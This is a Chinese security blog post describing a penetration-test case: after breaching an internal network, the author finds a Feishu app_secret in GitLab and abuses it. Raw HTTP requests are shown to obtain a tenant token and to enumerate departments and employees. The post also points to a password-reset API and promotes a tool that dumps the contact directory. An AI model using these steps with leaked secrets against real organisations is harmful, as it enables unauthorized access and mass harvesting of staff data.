#  记一次飞书app_secret泄露的利用

原创 安全艺术 [ 安全艺术 ](javascript:void\(0\);)

**安全艺术** ![]()

微信号 AnQuanYiShu2022

功能介绍 安全培训、渗透测试欢迎来聊

____

___发表于_

收录于合集

**0x00 案例**  

hvv前的日常测试，成功打入内网，进入gitlab翻了翻，发现了feishu的app_secret：

![](https://gitee.com/fuli009/images/raw/master/public/20230714180201.png)

查看飞书官方文档，简单利用如下：1、获取tennat_access_token

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /open-apis/auth/v3/tenant_access_token/internal HTTP/2Host: open.feishu.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Te: trailersConnection: closeContent-Type: application/jsonContent-Length: 97  
    {    "app_id": "******",    "app_secret": "******"}

![](https://gitee.com/fuli009/images/raw/master/public/20230714180202.png)2、获取部门信息，使用1中的tenant_access_token替换Authorization中的******

  *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    GET /open-apis/contact/v3/scopes HTTP/2Host: open.feishu.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneAuthorization: Bearer ******Sec-Fetch-User: ?1Te: trailers  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230714180203.png)

3、根据部门id获取部门员工信息

  *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    GET /open-apis/contact/v3/users/find_by_department?department_id=****** HTTP/2Host: open.feishu.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneAuthorization: Bearer ******Sec-Fetch-User: ?1Te: trailers  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230714180204.png)

4、更多玩法https://open.feishu.cn/document/server-
docs/admin-v1/password/reset![](https://gitee.com/fuli009/images/raw/master/public/20230714180205.png)可惜本次获取的app_secret权限不足……

 ** **0x01 工具****

将飞书的app_secret和小伙伴沟通了下，然后飞书的利用模块就上线了，简单介绍下吧

使用`use
feishu`选择模块，注意红色方框里的说明![](https://gitee.com/fuli009/images/raw/master/public/20230714180206.png)设置认证信息后执行![](https://gitee.com/fuli009/images/raw/master/public/20230714180208.png)导出通信录，不提供部门id的话会获取所有的授权访问部门信息，如果能确定部门权限为全部门，请手动赋值部门id为0，不然获取到的用户信息可能不全

![](https://gitee.com/fuli009/images/raw/master/public/20230714180209.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230714180211.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230714180212.png)

工具地址：https://github.com/fasnow/idebug

目前已集成企业微信和飞书的利用，后续会集成更多利用模块，欢迎star持续关注哈

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

